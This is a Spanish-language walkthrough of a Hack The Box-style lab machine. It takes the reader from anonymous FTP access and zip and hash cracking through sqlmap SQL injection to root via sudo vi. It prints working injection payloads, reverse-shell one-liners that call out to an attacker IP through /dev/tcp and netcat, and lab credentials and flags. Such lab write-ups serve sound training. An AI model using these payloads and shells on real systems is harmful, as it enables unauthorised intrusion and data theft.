#### nmap
```python
nmap -sVC 10.129.66.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 16:29 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 28.95% done; ETC: 16:29 (0:00:20 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 77.37% done; ETC: 16:29 (0:00:06 remaining)
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 16:30 (0:00:03 remaining)
Nmap scan report for 10.129.66.130
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.157
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

###### Podemos ver que el puerto 21 esta corriendo el servicio ftp el cual esta configurado por defecto como anonymous
# ftp
```python
ftp 10.129.66.130
Connected to 10.129.66.130.
220 (vsFTPd 3.0.3)
Name (10.129.66.130:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10423|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
```

##### al entrar nos damos cuenta que existe un archivo backup.zip el cual descargaremos usando `get backup.zip` si hacemos `unzip backup.zip` al intentar descomprimir el archivo nos damos cuenta que esta cifrado por lo que usaremos `john the ripper con la opcion zip2john` 

```python
zip2john backup.zip > backuphash  
```
##### con la opcion `>` cambiamos el nombre para que podamos ver el hash de la contraseña, ahora le hacemos un `cat` para ver si tenemos el hash y si todo esta correcto le pasamos el john 

```python
john -wordlist=/usr/share/wordlists/rockyou.txt backuphash

--Passw: 741852963
```

![[2023-10-11_17-11.png]]

#### conseguimos dos archivos: `index.php` `style.css` el index.php se ve prometedor asi que le hacemos un `cat`

![[2023-10-11_17-21.png]]
#### conseguimos lo que parece ser una contraseña que esta codificada en otro hash. entonces usaremos hashid para intentar saber que tipo de hash es 

```python
:hashid 2cb42f8734ea607eefed3b70af13bbd3
```
![[2023-10-11_17-42.png]]

#### Podriamos probar con MD2 - MD5 y MD4 que son los mas comunes. para esto usaremos `hashcat`

```python
hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
```
![[2023-10-11_17-53.png]]

#### Bueno nos guardamos la contraseña probaremos entrar en la direccion web ya que en el reconocimiento nmap nos damos cuenta que tambien tiene el puerto 80 abierto

![[2023-10-11_18-14.png]]

#### iniciamos con las credenciales que hemos conseguido
```python
--admin
--qwerty789
```

![[2023-10-11_18-48.png]]

#### logramos entrar y haciendo unas pruebas rapidas parece que la pag esta conectada a la base de datos y es vulnerable a SQLI. 

```python
como podemos saber si es vulnebrable a SQLI. en el buscador ponemos una comilla simple ` y damos enter y vemos que aparece un error. esto se debe a que la pag esta leyendo la comilla como si fuera un caracter alfa numerico y no como un caracter especial como deberia ser
```
para verificar esto usaremos `sqlmap`
```python
sqlmap -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg"

-u para indicar la url de la pag 
--cookie para indicar la cookie de session 

si hacemos sqlmap -h se abre el panel de ayuda y podemos ver que el comando --current-db nos enumera la base de datos actual en la que estamos asi que usaremos ese 

tambien podemos ver que existe uno llamado --batch para que realice todas las acciones por defecto sin pregunytarnos nada. asi que el comando nos queda de la sigiente manera: 
------------------------------------------------------
sqlmap --current-db -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
------------------------------------------------------
```

#### Podemos ver que el resultado:
![[2023-10-11_19-11.png]]

#### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public

```python
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=a' AND (SELECT (CASE WHEN (1509=1509) THEN NULL ELSE CAST((CHR(101)||CHR(86)||CHR(75)||CHR(74)) AS NUMERIC) END)) IS NULL-- nIOk

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=a' AND 2166=CAST((CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2166=2166) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(107)||CHR(113)||CHR(113)) AS NUMERIC)-- NgJP

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=a' AND 7512=(SELECT 7512 FROM PG_SLEEP(5))-- tfIZ
```

#### ahora que sabemos el nombre de la base de datos podemos enumerarla usando el mismo comando sqlmap con una pequeña variante: 
```python
sqlmap -D public --tables -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
```
conseguimos una tabla llamada cars asi que buscaremos esa tabla con el siguiente comando
```python
sqlmap -D public -T cars --culumns -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
```

![[2023-10-11_19-25.png]]

#### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.

```python
sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
```

![[2023-10-11_19-35.png]]

#### de esta manera hemos conseguido una shell interactiva. pero esta shell esta un poco limitada asi que podemos intentar enviarnos una reverse shell a nuestro equipo para poder interactuar de mejor manera.

```python
sh -i >& /dev/tcp/10.10.15.157/8001 0>&1
```

```python
bash -c 'bash -i >& /dev/tcp/10.10.15.157/8001 0>&1'
```

#### con esta bash notamos que perdemos coneccion. asi que usaremos una enviada por netcat para intentar resolver esto.

```python
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```

### despues de esto hacemos tratamiento tty y empezamos a examinar la maquina.
user.txt
```python
ec9b13ca4d6229cd5cc1e09980965bf7
```

#### vamos a navegar hasta el directorio donde esta alojada la base de datos
passid:
```python
2cb42f8734ea607eefed3b70af13bbd3
```
db:id
```python
user: postgres
password: P@s5w0rd!
```

#### con estas credenciales podriamos intentar entrar via ssh

hacemos sudo -l para saber cuales son los permiso que tiene el usuario postgres como administrador 

```python
/bin/vi /etc/postgresql/11/main/pg_hba.config`

vemos que tiene permisos solo en este archivo asi que lo ejecutaremos como administrador 

`sudo /bin/vi /etc/postgresql/11/main/pg_hba.config`

abrimos el archivo, ponemos : y le decimos que nos de una shell y presionamos enter. 
automaticamente seremos root

root.txt
```css
dd6e058e814260bc70e9bbdef2715849
```

